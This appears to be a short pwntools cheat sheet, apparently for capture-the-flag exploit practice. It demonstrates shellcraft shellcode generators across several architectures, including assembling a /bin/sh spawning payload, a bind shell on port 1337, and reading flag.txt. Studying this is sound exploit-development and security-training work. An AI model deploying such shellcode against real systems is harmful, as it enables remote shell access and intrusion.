from pwn import *

## context must be set ##
context(arch='amd64', os='linux')
context.clear() # must be called if context is switched
context(arch='i386', os='linux')
context.clear()
context(arch='arm', os='linux')

## premade shell example ##
sh64 = shellcraft.sh()
payload = asm(sh64) # asm() will assemble any shellcode in intel syntax

## other premades ##
shellcraft.crash()
shellcraft.infloop()
shellcraft.bindsh(1337, 'ipv4')
shellcraft.cat('flag.txt') # second param can be file descriptor

shellcraft.memcpy(dest_addr, src_addr, count)
shellcraft.pushstr('any string you want, pushed just for you')
shellcraft.setregs({'rax': 1, 'rdx': 1000, 'rcx': 'rsp'})

## individual instructions ##
shellcraft.mov('rax', 'rdx')

shellcraft.mov('rax', 0xDEADBEEF)

shellcraft.push(0xBADF00D)
shellcraft.pop('rdx')

shellcraft.push(u64('/bin/sh\0'))
shellcraft.pop('rax')
